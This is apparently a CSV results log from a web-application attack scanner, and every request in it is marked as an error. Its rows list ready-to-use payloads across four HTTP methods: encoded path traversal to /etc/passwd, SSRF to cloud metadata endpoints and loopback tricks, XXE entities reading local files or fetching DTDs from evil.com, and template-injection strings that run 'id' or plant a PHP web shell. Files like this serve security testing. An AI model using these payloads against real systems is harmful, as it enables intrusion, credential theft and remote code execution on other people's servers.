Category,Method,Status,Response Time (ms),Payload,Is Redirect,WAF Detected,WAF Type,Timestamp,URL
"Path Traversal - Encoded","DELETE",ERR,0,"%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","DELETE",ERR,0,"%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"%e0%80%ae%e0%80%ae/etc/passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"%e0%80%ae%e0%80%ae/etc/passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"%e0%80%ae%e0%80%ae/etc/passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","DELETE",ERR,0,"%e0%80%ae%e0%80%ae/etc/passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"..%00/..%00/..%00/etc/passwd%00",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"..%00/..%00/..%00/etc/passwd%00",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"..%00/..%00/..%00/etc/passwd%00",false,false,"Unknown","",""
"Path Traversal - Encoded","DELETE",ERR,0,"..%00/..%00/..%00/etc/passwd%00",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"..//..//..//etc//passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"..//..//..//etc//passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"..//..//..//etc//passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","DELETE",ERR,0,"..//..//..//etc//passwd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"..\u005c..\u005c..\u005cwindows\u005cwin.ini",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"..\u005c..\u005c..\u005cwindows\u005cwin.ini",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"..\u005c..\u005c..\u005cwindows\u005cwin.ini",false,false,"Unknown","",""
"Path Traversal - Encoded","DELETE",ERR,0,"..\u005c..\u005c..\u005cwindows\u005cwin.ini",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"..%5c..%5c..%5cwindows%5cwin.ini",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"..%5c..%5c..%5cwindows%5cwin.ini",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"..%5c..%5c..%5cwindows%5cwin.ini",false,false,"Unknown","",""
"Path Traversal - Encoded","DELETE",ERR,0,"..%5c..%5c..%5cwindows%5cwin.ini",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://%31%32%37%2e%30%2e%30%2e%31/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://%31%32%37%2e%30%2e%30%2e%31/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://%31%32%37%2e%30%2e%30%2e%31/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://%31%32%37%2e%30%2e%30%2e%31/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://2130706433/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://2130706433/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://2130706433/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://2130706433/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://0177.0.0.1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://0177.0.0.1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://0177.0.0.1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://0177.0.0.1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://0x7f.0x0.0x0.0x1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://0x7f.0x0.0x0.0x1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://0x7f.0x0.0x0.0x1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://0x7f.0x0.0x0.0x1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://[::1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://[::1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://[::1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://[::1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://[0:0:0:0:0:0:0:1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://[0:0:0:0:0:0:0:1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://[0:0:0:0:0:0:0:1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://[0:0:0:0:0:0:0:1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://[::ffff:127.0.0.1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://[::ffff:127.0.0.1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://[::ffff:127.0.0.1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://[::ffff:127.0.0.1]/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"dict://127.0.0.1:11211/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"dict://127.0.0.1:11211/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"dict://127.0.0.1:11211/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"dict://127.0.0.1:11211/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"gopher://127.0.0.1:80/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"gopher://127.0.0.1:80/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"gopher://127.0.0.1:80/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"gopher://127.0.0.1:80/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"ldap://127.0.0.1:389/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"ldap://127.0.0.1:389/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"ldap://127.0.0.1:389/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"ldap://127.0.0.1:389/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://127.0.0.1.evil.com/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://127.0.0.1.evil.com/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://127.0.0.1.evil.com/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://127.0.0.1.evil.com/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://evil.com@127.0.0.1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://evil.com@127.0.0.1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://evil.com@127.0.0.1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://evil.com@127.0.0.1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://127.0.0.1#@evil.com/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://127.0.0.1#@evil.com/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://127.0.0.1#@evil.com/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://127.0.0.1#@evil.com/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://169.254.169.254/latest/meta-data/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://169.254.169.254/latest/meta-data/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://169.254.169.254/latest/meta-data/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://169.254.169.254/latest/meta-data/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://metadata.google.internal/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://metadata.google.internal/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://metadata.google.internal/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://metadata.google.internal/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://169.254.169.254/metadata/v1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://169.254.169.254/metadata/v1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://169.254.169.254/metadata/v1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://169.254.169.254/metadata/v1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://127.0.0.1.localtest.me/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://127.0.0.1.localtest.me/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://127.0.0.1.localtest.me/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://127.0.0.1.localtest.me/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"http://sudo.cc/127.0.0.1",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"http://sudo.cc/127.0.0.1",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"http://sudo.cc/127.0.0.1",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"http://sudo.cc/127.0.0.1",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"file:///etc/passwd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"file:///etc/passwd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"file:///etc/passwd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"file:///etc/passwd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"file://\u002fetc\u002fpasswd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"file://\u002fetc\u002fpasswd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"file://\u002fetc\u002fpasswd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"file://\u002fetc\u002fpasswd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",ERR,0,"file://%2fetc%2fpasswd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","POST",ERR,0,"file://%2fetc%2fpasswd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","PUT",ERR,0,"file://%2fetc%2fpasswd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","DELETE",ERR,0,"file://%2fetc%2fpasswd",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",ERR,0,"%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",false,false,"Unknown","",""
"XXE - Advanced Vectors","POST",ERR,0,"%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",false,false,"Unknown","",""
"XXE - Advanced Vectors","PUT",ERR,0,"%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",false,false,"Unknown","",""
"XXE - Advanced Vectors","DELETE",ERR,0,"%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",ERR,0,"\u003C\u003Fxml version\u003D\u00221.0\u0022\u003F\u003E\u003C\u0021DOCTYPE foo \u005B\u003C\u0021ENTITY xxe SYSTEM \u0027file\u003A\u002F\u002F\u002Fetc\u002Fpasswd\u0027\u003E\u005D\u003E\u003Cfoo\u003E\u0026xxe\u003B\u003C\u002Ffoo\u003E",false,false,"Unknown","",""
"XXE - Advanced Vectors","POST",ERR,0,"\u003C\u003Fxml version\u003D\u00221.0\u0022\u003F\u003E\u003C\u0021DOCTYPE foo \u005B\u003C\u0021ENTITY xxe SYSTEM \u0027file\u003A\u002F\u002F\u002Fetc\u002Fpasswd\u0027\u003E\u005D\u003E\u003Cfoo\u003E\u0026xxe\u003B\u003C\u002Ffoo\u003E",false,false,"Unknown","",""
"XXE - Advanced Vectors","PUT",ERR,0,"\u003C\u003Fxml version\u003D\u00221.0\u0022\u003F\u003E\u003C\u0021DOCTYPE foo \u005B\u003C\u0021ENTITY xxe SYSTEM \u0027file\u003A\u002F\u002F\u002Fetc\u002Fpasswd\u0027\u003E\u005D\u003E\u003Cfoo\u003E\u0026xxe\u003B\u003C\u002Ffoo\u003E",false,false,"Unknown","",""
"XXE - Advanced Vectors","DELETE",ERR,0,"\u003C\u003Fxml version\u003D\u00221.0\u0022\u003F\u003E\u003C\u0021DOCTYPE foo \u005B\u003C\u0021ENTITY xxe SYSTEM \u0027file\u003A\u002F\u002F\u002Fetc\u002Fpasswd\u0027\u003E\u005D\u003E\u003Cfoo\u003E\u0026xxe\u003B\u003C\u002Ffoo\u003E",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",ERR,0,"%3C%21DOCTYPE%20data%20%5B%3C%21ENTITY%20%25%20file%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%20%25file%3B%5D%3E",false,false,"Unknown","",""
"XXE - Advanced Vectors","POST",ERR,0,"%3C%21DOCTYPE%20data%20%5B%3C%21ENTITY%20%25%20file%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%20%25file%3B%5D%3E",false,false,"Unknown","",""
"XXE - Advanced Vectors","PUT",ERR,0,"%3C%21DOCTYPE%20data%20%5B%3C%21ENTITY%20%25%20file%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%20%25file%3B%5D%3E",false,false,"Unknown","",""
"XXE - Advanced Vectors","DELETE",ERR,0,"%3C%21DOCTYPE%20data%20%5B%3C%21ENTITY%20%25%20file%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%20%25file%3B%5D%3E",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",ERR,0,"%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%27http%3A%2F%2Fevil.com%2Fevil.dtd%27%3E%20%25xxe%3B%5D%3E",false,false,"Unknown","",""
"XXE - Advanced Vectors","POST",ERR,0,"%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%27http%3A%2F%2Fevil.com%2Fevil.dtd%27%3E%20%25xxe%3B%5D%3E",false,false,"Unknown","",""
"XXE - Advanced Vectors","PUT",ERR,0,"%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%27http%3A%2F%2Fevil.com%2Fevil.dtd%27%3E%20%25xxe%3B%5D%3E",false,false,"Unknown","",""
"XXE - Advanced Vectors","DELETE",ERR,0,"%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%27http%3A%2F%2Fevil.com%2Fevil.dtd%27%3E%20%25xxe%3B%5D%3E",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo><![CDATA[&xxe;]]></foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","POST",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo><![CDATA[&xxe;]]></foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","PUT",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo><![CDATA[&xxe;]]></foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","DELETE",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo><![CDATA[&xxe;]]></foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com/evil"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","POST",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com/evil"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","PUT",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com/evil"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","DELETE",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com/evil"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""ftp://evil.com/evil"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","POST",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""ftp://evil.com/evil"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","PUT",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""ftp://evil.com/evil"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","DELETE",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""ftp://evil.com/evil"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""expect://id"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","POST",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""expect://id"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","PUT",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""expect://id"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","DELETE",ERR,0,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""expect://id"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"%7B%7B7%2A7%7D%7D",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"%7B%7B7%2A7%7D%7D",false,false,"Unknown","",""
"SSTI - Framework Specific","PUT",ERR,0,"%7B%7B7%2A7%7D%7D",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"%7B%7B7%2A7%7D%7D",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"\u007B\u007B7\u002A7\u007D\u007D",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"\u007B\u007B7\u002A7\u007D\u007D",false,false,"Unknown","",""
"SSTI - Framework Specific","PUT",ERR,0,"\u007B\u007B7\u002A7\u007D\u007D",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"\u007B\u007B7\u002A7\u007D\u007D",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","PUT",ERR,0,"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"{{cycler.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"{{cycler.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","PUT",ERR,0,"{{cycler.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"{{cycler.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"{{joiner.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"{{joiner.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","PUT",ERR,0,"{{joiner.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"{{joiner.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"%7B%7B%5F%73%65%6C%66%7D%7D",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"%7B%7B%5F%73%65%6C%66%7D%7D",false,false,"Unknown","",""
"SSTI - Framework Specific","PUT",ERR,0,"%7B%7B%5F%73%65%6C%66%7D%7D",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"%7B%7B%5F%73%65%6C%66%7D%7D",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"{{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"{{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}",false,false,"Unknown","",""
"SSTI - Framework Specific","PUT",ERR,0,"{{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"{{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"{php}echo `id`;{/php}",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"{php}echo `id`;{/php}",false,false,"Unknown","",""
"SSTI - Framework Specific","PUT",ERR,0,"{php}echo `id`;{/php}",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"{php}echo `id`;{/php}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php passthru($_GET[cmd]); ?>"",false)}",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php passthru($_GET[cmd]); ?>"",false)}",false,false,"Unknown","",""
"SSTI - Framework Specific","PUT",ERR,0,"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php passthru($_GET[cmd]); ?>"",false)}",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php passthru($_GET[cmd]); ?>"",false)}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id"")",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id"")",false,false,"Unknown","",""
"SSTI - Framework Specific","PUT",ERR,0,"$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id"")",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id"")",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"#set($str=$class.inspect(""java.lang.String"").type)",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"#set($str=$class.inspect(""java.lang.String"").type)",false,false,"Unknown","",""
"SSTI - Framework Specific","PUT",ERR,0,"#set($str=$class.inspect(""java.lang.String"").type)",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"#set($str=$class.inspect(""java.lang.String"").type)",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""id"") }",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""id"") }",false,false,"Unknown","",""
